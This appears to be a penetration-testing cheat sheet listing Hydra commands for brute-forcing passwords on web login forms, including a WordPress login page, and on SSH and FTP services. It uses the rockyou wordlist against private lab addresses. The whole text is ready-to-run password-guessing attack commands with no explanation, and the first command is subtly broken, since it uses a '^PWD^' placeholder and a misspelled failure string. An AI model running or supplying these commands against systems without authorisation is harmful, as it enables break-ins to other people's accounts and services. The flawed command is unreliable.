### Hydra Bruteforcing Commands

#### Post Web Form
```
hydra -l username -P <password_list> 192.168.1.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The passowrd you entered for the username" -t 30
```
```
hydra -l username -P /usr/share/wordlists/rockyou.txt 192.168.1.1  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.95.51 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid:H=Cookie: security=low; PHPSESSID=ms2hav3kj1jdenpsvfpj7c66v4"
```

#### SSH
```
hydra -l username -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh -vv -t 4
```
#### FTP
```
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1
```
